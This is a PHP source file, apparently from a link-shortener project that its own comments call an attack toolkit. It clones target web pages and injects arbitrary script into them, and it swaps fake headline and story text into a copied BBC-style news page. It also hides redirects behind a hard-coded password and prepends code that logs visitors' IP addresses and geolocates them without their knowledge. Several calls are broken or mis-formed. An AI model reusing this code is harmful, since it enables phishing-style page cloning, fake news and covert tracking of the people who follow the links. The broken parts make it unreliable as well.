<?php
require_once "../scripts/simple_html_dom.php";
require_once "../php/DataBaseHandling.php";

//adapted from http://stackoverflow.com/questions/834303/startswith-and-endswith-functions-in-php.
//Check if a string starts with a substring
function startsWith($fullString, $subString) {
    // search backwards starting from haystack length characters from the end
    return $subString === "" || strrpos($fullString, $subString, -strlen($fullString)) !== FALSE;
}
//Check if a string ends with a substring
function endsWith($fullString, $subString) {
    // search forward starting from end minus needle length characters
    return $subString === "" || (($temp = strlen($fullString) - strlen($subString)) >= 0 && strpos($fullString, $subString, $temp) !== false);
}


function changeToKeyPath($key){
     $path = "../".$key;
    chdir($path);
}
//Prepend in a document.
function prepend($string, $filename) {
  $context = stream_context_create();
  $fp = fopen($filename, 'r', 1, $context);
  $tmpname = md5($string);
  file_put_contents($tmpname, $string);
  file_put_contents($tmpname, $fp, FILE_APPEND);
  fclose($fp);
  unlink($filename);
  rename($tmpname, $filename);
}

//DUPLICATING HTML FILE ONTO OWN SERVER
function duplicateHtml($link,$key){
    changeToKeyPath($key);
    $htmlFileName = "index.php";
    $html=fopen($htmlFileName, "w+");
    fwrite($html , file_get_contents($link));
    fclose($html);
    return $htmlFileName;
}

//CREATING PATHS FOR OTHER FILES FOUND IN HTML
function downloadAndCreateImage($link , $htmlFileName){
    $html = file_get_html($htmlFileName);
    foreach($html->find('img') as $element){
        $img = $element->src ;
       if (preg_match('#^https?://#i', $img) === 0) {
           if(startsWith($img , "/")){
                if(startsWith($img , '//')){
                    $element->src = $link.substr(1,strlen($img));
                }
                else{
                     $element->src = $link.$img ;    
                }
           }
           else{
            $element->src = $link."/".$img ;
           }
           
       }
    }
    
    
    $html->save($htmlFileName);
    return $html;
 
}

function checkIfImage($ref){
    if(!(endsWith($ref , ".png") || endsWith($ref , ".jpg"))){
        return true;
    }
    else{
        return false;
    }
}

function downloadPages($html , $link){
      foreach($html->find('a') as $element){
                    $ref = $element->href ;
                    if(preg_match('#^https?://#i', $ref) === 0){
                        $bool = checkIfImage($ref);
                        if($bool === false){
                                if(startsWith($ref , "/")){
                                    $element->href = $link.$ref;                
                                }
                                else{
                                    $element->href = $link."/".$ref;
                                }
                            duplicateHtml($element->href);
                        }   
                    }
                  else{
                    duplicateHtml($element->href);
                  }
             }
}


function changingLinks($html , $type , $link){
    
    switch ($type){
        case 1:    
             foreach($html->find('a') as $element){
                    $ref = $element->href ; 
                    if(preg_match('#^https?://#i', $ref) === 0){
                        if(startsWith($ref , "/")){
                            if(startsWith($ref , "//")){
                                $element->href = $link.substr(1,strlen($ref));
                            }
                            else{
                                $element->href = $link.$ref;
                            }
                        }
                        else{
                            $element->href = $link."/".$ref;
                        }
                    }        
             }
             foreach($html->find('link') as $element){
                    $ref = $element->href; 
                //    echo $ref;
                    if(preg_match('#^https?://#i', $ref) === 0){
                        if(startsWith($ref , "/")){
                            if(startsWith($ref , "//")){
                                $element->href = $link.substr(1,strlen($ref));
                            }
                            else{
                                $element->href = $link.$ref;
                            }
                        }
                        else{
                            $element->href = $link."/".$ref;
                        }
                    }        
             }
            
             break;
            
        case 2:
             foreach($html->find('a') as $element){
                    $element->href = "$link";
        
             }
             break;
            
    }
    
    
}


function clearHTML($html){
    $html->clear();
        unset($html);
}

function editContents($htmlFileName,$link,$key){   
   $conn = openConnection();
    $actual_link = "http://stme.esy.es/".$key;
    $html = downloadAndCreateImage($link , $htmlFileName);
    changingLinks($html , 2 , $actual_link);
    
    $news = "";
    $news = getNewsFromDatabase($conn); 
    $newsArray = explode(',', $news);
    $title = $newsArray[0];
    $imgsrc = $newsArray[1];
    $news = $newsArray[2];
    $header = $newsArray[3];
    foreach($html->find('h1') as $element){
       $element->innertext = "<p>$header</p>";
        break;
    }
    
    foreach($html->find('div.story-body__inner') as $element){
        $element->innertext = "<img class='js-image-replace' width='976' height='549' src='$imgsrc'</img>
        <p class='story-body__introduction'>$title</p><p>$news</p>";
        break; 
    }
    $html->save($htmlFileName);
    
}

//OPENING CONNECTION AND GETTING
//REDIRECTING TO LONG LINK
function redirectToOriginalLink($htmlFileName){
    header("access-control-allow-origin: *");
    header("Location: ".$htmlFileName, true, 303);
    die();
}
// MAIN SCRIPT THAT RUNS FOR MOST ATTACK
function runScript($textToInsert,$conn,$key){
   
    $link = selectDataFromDatabase($key,$conn);
    $htmlFileName = duplicateHtml($link,$key);
    $html = downloadAndCreateImage($link,$htmlFileName);
    changingLinks($html,1,$link);
    $element = $html->find('head',0);
    $element->innertext = $element->innertext.$textToInsert;
    $html->save($htmlFileName);
    clearHtml($html);    
}

function runIframeScript($conn,$key){
    $link = selectDataFromDatabase($key, $conn);
    $textToInsert = "<iframe width='100%' height='100%' src='$link' frameborder='0'></iframe>";
     changeToKeyPath($key);
    $htmlFileName = "index.html";
    $html=fopen($htmlFileName, "a+");
    fwrite($html , '<html><head>'.$textToInsert.'</head><body></body></html>');
    fclose($html); 
}

function runAffliateScript($conn,$key){
    $link = selectDataFromDatabase($key, $conn);
    header("Location: ".$link, true, 302);
}

function runPasswordScript($key){
    //SEARCHING DATABASE WITH KEY TO GET LONGLINK
    $script = '<?php require_once "../php/DataBaseHandling.php";  
    $conn = openConnection();
    $link = selectArrayFromDatabase("'.$key.'", $conn); 
    if(!is_null($_GET["password"])){
    if($_GET["password"] === "123456"){
        $link = (string)$link[1];
    }
    else{
        $link = (string)$link[0];
    }
    }
    else{
        $link = (string)$link[0];
    }

     header("access-control-allow-origin: *");
    header("Location: ".$link, true, 303);
    die();
    ?>';
    changeToKeyPath($key);
    $html=fopen("index.php", "a+");
    fwrite($html , $script);
    fclose($html); 
}

function runTrackingScript($textToInsert,$conn,$key){
    //SEARCHING DATABASE WITH KEY TO GET LONGLINK
    $jQueryAPI ="<script src='//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js'></script>";
    $link = selectDataFromDatabase($key, $conn);
    $htmlFileName = duplicateHtml($link);
    $html = downloadAndCreateImage($link , $htmlFileName);
    clearHTML($html);
    $contents = file_get_contents("$htmlFileName");
    $text = $jQueryAPI.$textToInsert;
    $newContent = preg_replace("</head>",$text."</head", $contents);
    file_put_contents($htmlFileName, $newContent);
}

function runBbcScript($conn,$key){
     $conn = openConnection();
    $link = selectDataFromDatabase($key, $conn);
    $htmlFileName = duplicateHtml($link,$key);
    $text ="<?php require '../php/BaseController.php'; changeToKeyPath('$key'); editContents('$htmlFileName',
    '$link','$key'); ?>";
    changeToKeyPath($key);
    prepend($text,$htmlFileName);
}

function runVirusScript($conn,$key){
    $link = selectDataFromDatabase($key, $conn);
}

//Referenced from http://tutorialzine.com/2010/03/who-is-online-widget-php-mysql-jquery/
function runDosScript($textToInsert,$conn,$key){
     
    //duplicate Html and create index.php file
    runScript($textToInsert,$conn,$key);
    $script = '<?php require_once "../php/DataBaseHandling.php"; $conn=openConnection();';
    $script.= '$ip=$_SERVER["REMOTE_ADDR"];';
    $script.= '$key = "'.$key.'";';
    $script.='$link="http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; $result = checkForDuplicateSessions($conn,$ip,$link);
    if(!$result){
        if($_COOKIE["geoData"]){
		// A "geoData" cookie has been previously set by the script, so we will use it
		
		// Always escape any user input, including cookies:
		list($city,$countryName,$countryAbbrev) = explode("|",mysqli_real_escape_string($conn ,strip_tags($_COOKIE["geoData"])));
	   }
        else{
            // Making an API call to Hostip:
            $json = json_decode(file_get_contents("http://geoip.nekudo.com/api/'."$ip".'/en/full"));

            $city = $json->city->names->en;

            $countryName = $json->country->names->en;

            $countryAbbrev = $json->country->iso_code;

            // Setting a cookie with the data, which is set to expire in a month:
            setcookie("geoData",$city."|".$countryName."|".$countryAbbrev."|".time()+60*60*24*30);
        }
	    // In case the Hostip API fails:
        if (!$countryName){
            $countryName="UNKNOWN";
            $countryAbbrev="XX";
            $city="(Unknown City?)";
        }
        addSessionToDatabase($conn,$ip,$city,$countryName,$countryAbbrev,$link);
    
    }
    else{
        // If the visitor is already online, just update the dt value of the row:
        updateSessionFromDatabase($conn,$ip,$link);
    }

    // Removing entries not updated in the last 10 minutes:
    deleteSessionFromDatabase($conn);?>';
    //get to the correct directory
     changeToKeyPath($key);
    //add script to index.php itself 
    prepend($script , "index.php");
}



?>
